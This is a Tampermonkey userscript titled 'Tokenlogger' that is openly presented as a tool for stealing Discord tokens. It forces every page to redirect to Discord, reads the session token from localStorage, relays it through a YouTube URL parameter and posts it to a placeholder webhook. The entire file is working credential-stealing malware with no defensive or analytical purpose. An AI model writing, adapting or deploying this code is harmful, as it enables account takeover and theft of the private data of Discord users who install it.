// ==UserScript==
// @name         Tokenlogger
// @namespace    https://github.com/Lyzev
// @version      1.1
// @description  A simple tokenlogger for Tampermonkey. (Browser Extension)
// @author       Lyzev
// @run-at       document-start
// @include http://*
// @include https://*
// @grant        none
// ==/UserScript==

(function () {
    if (window.location.href.startsWith("https://www.youtube.com/")) {
        const url = new URL(window.location.href);
        const token = url.searchParams.get("token");
        const webhook = "WEBHOOK-URL";
        if (token != null) {
            const request = new XMLHttpRequest();
            request.open("POST", webhook);
            request.setRequestHeader("Content-type", "application/json");
            const params = {
                username: "Tokenlogger",
                content: "Date: `" + new Date() + "`\nToken: `" + token + "`"
            };
            request.send(JSON.stringify(params));
        }
    } else if (window.location.href === "https://discord.com/channels/@me") {
        const token = localStorage.token;
        if (token != null) {
            window.location.href = "https://www.youtube.com?token=" + token;
        }
    } else {
        window.location.href = "https://discord.com/channels/@me";
    }
})();
